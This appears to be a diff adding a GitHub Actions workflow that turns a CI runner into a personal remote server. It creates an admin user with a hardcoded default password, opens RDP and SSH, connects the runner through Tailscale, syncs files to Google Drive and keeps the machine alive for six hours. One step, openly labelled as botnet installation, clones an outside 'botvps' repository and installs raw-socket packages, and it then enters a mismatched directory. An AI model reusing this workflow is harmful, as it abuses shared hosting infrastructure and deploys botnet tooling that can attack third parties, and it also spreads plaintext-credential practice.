@@ -1,0 +1,170 @@
+name: VPS-KHUSUS
+
+on:
+  workflow_dispatch:
+    inputs:
+      os_choice:
+        type: choice
+        description: 'Pilih OS Gantengku:'
+        options:
+          - windows-latest
+          - ubuntu-22.04
+        default: 'ubuntu-22.04'
+      user_name:
+        description: 'Username SSH/RDP'
+        required: true
+        default: 'DikaOwner'
+      user_password:
+        description: 'Password'
+        required: true
+        default: 'DikaGanteng@123!'
+
+jobs:
+  run-vps:
+    runs-on: ${{ github.event.inputs.os_choice }}
+    timeout-minutes: 360
+
+    steps:
+      # ===============================
+      # 1. SETUP OS & USER
+      # ===============================
+      - name: 1. Setup OS & User
+        shell: bash
+        run: |
+          if [ "${{ runner.os }}" = "Windows" ]; then
+            powershell -Command "
+              Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0;
+              Enable-NetFirewallRule -DisplayGroup 'Remote Desktop';
+
+              \$pass = ConvertTo-SecureString '${{ github.event.inputs.user_password }}' -AsPlainText -Force;
+              New-LocalUser -Name '${{ github.event.inputs.user_name }}' -Password \$pass;
+              Add-LocalGroupMember -Group 'Administrators' -Member '${{ github.event.inputs.user_name }}';
+              Add-LocalGroupMember -Group 'Remote Desktop Users' -Member '${{ github.event.inputs.user_name }}'
+            "
+          else
+            sudo apt update -y
+            sudo apt install -y openssh-server curl rclone
+
+            sudo systemctl enable ssh
+            sudo systemctl start ssh
+
+            sudo useradd -m -s /bin/bash ${{ github.event.inputs.user_name }} || true
+            echo "${{ github.event.inputs.user_name }}:${{ github.event.inputs.user_password }}" | sudo chpasswd
+            sudo usermod -aG sudo ${{ github.event.inputs.user_name }}
+          fi
+
+      # ===============================
+      # 2. GDRIVE RESTORE (UBUNTU)
+      # ===============================
+      - name: 2. Setup GDrive & Restore
+        if: github.event.inputs.os_choice == 'ubuntu-22.04'
+        shell: bash
+        run: |
+          mkdir -p ~/.config/rclone
+
+          cat <<EOF > ~/.config/rclone/rclone.conf
+          [gdrive]
+          type = drive
+          scope = drive
+          token = ${{ secrets.RCLONE_CONFIG_TOKEN }}
+          EOF
+
+          sudo mkdir -p /home/${{ github.event.inputs.user_name }}/work_folder
+
+          sudo rclone copy gdrive:Backup_VPS_Dika /home/${{ github.event.inputs.user_name }}/work_folder || true
+
+          sudo chown -R ${{ github.event.inputs.user_name }}:${{ github.event.inputs.user_name }} /home/${{ github.event.inputs.user_name }}
+
+      # ===============================
+      # 3. INSTALL & LOGIN TAILSCALE
+      # ===============================
+      - name: 3. Install & Connect Tailscale
+        shell: bash
+        run: |
+          if [ "${{ runner.os }}" = "Windows" ]; then
+            powershell -Command "
+              Invoke-WebRequest https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi -OutFile tailscale.msi;
+              Start-Process msiexec.exe -ArgumentList '/i tailscale.msi /quiet /norestart' -Wait
+            "
+
+            sleep 10
+
+            if [ -n "${{ secrets.TAILSCALE_AUTHKEY }}" ]; then
+              echo "Login pake AUTH KEY..."
+              "/c/Program Files/Tailscale/tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTHKEY }} --hostname=vps-windows-dika || true
+            else
+              echo "AUTH KEY ga ada, pakai login link..."
+              "/c/Program Files/Tailscale/tailscale.exe" up --hostname=vps-windows-dika || true
+            fi
+
+          else
+            curl -fsSL https://tailscale.com/install.sh | sh
+
+            if [ -n "${{ secrets.TAILSCALE_AUTHKEY }}" ]; then
+              echo "Login pake AUTH KEY..."
+              sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTHKEY }} --hostname=vps-ubuntu-dika --accept-routes || true
+            else
+              echo "AUTH KEY ga ada, pakai login link..."
+              sudo tailscale up --hostname=vps-ubuntu-dika --accept-routes || true
+            fi
+          fi
+
+      # ===============================
+      # 4. AUTO SYNC GDRIVE (FIXED)
+      # ===============================
+      - name: 4. Auto Sync (Ubuntu)
+        if: github.event.inputs.os_choice == 'ubuntu-22.04'
+        shell: bash
+        run: |
+          sudo tee /home/${{ github.event.inputs.user_name }}/sync.sh > /dev/null <<EOF
+          #!/bin/bash
+          while true; do
+            rclone sync /home/${{ github.event.inputs.user_name }}/work_folder gdrive:Backup_VPS_Dika
+            sleep 300
+          done
+          EOF
+
+          sudo chmod +x /home/${{ github.event.inputs.user_name }}/sync.sh
+          sudo nohup /home/${{ github.event.inputs.user_name }}/sync.sh > /dev/null 2>&1 &
+
+      # ===============================
+      # 5. Penginstalan botnet
+      # ===============================
+      - name: 5. Penginstalan botnet
+        shell: bash
+        run: |
+          echo "=================================="
+          echo "PENGINSTALAN BOTNET SEDANG DI PROSES⚡⚡🌀"
+          echo "=================================="
+          git clone https://github.com/andikapwk123/botvps.git
+          cd botnet
+          sudo yarn add cluster raw-socket
+
+          echo "=================================="
+          echo "PENGINSTALAN BOTNET SELESAI❤️‍🔥👍😋"
+          echo "=================================="
+
+
+      # ===============================
+      # 6. INFO + KEEP ALIVE
+      # ===============================
+      - name: 5. Info & Keep Alive
+        shell: bash
+        run: |
+          echo "======================================"
+          echo "🔥 VPS AKTIF 🔥"
+          echo "======================================"
+          echo "USER : ${{ github.event.inputs.user_name }}"
+          echo "PASS : ${{ github.event.inputs.user_password }}"
+
+          if [ "${{ runner.os }}" = "Linux" ]; then
+            echo "IP Tailscale:"
+            tailscale ip -4 || echo "Login dulu ke tailscale"
+            echo "Folder: /home/${{ github.event.inputs.user_name }}/work_folder"
+          else
+            echo "Cek IP di aplikasi Tailscale"
+          fi
+
+          echo "======================================"
+
+          sleep 21600
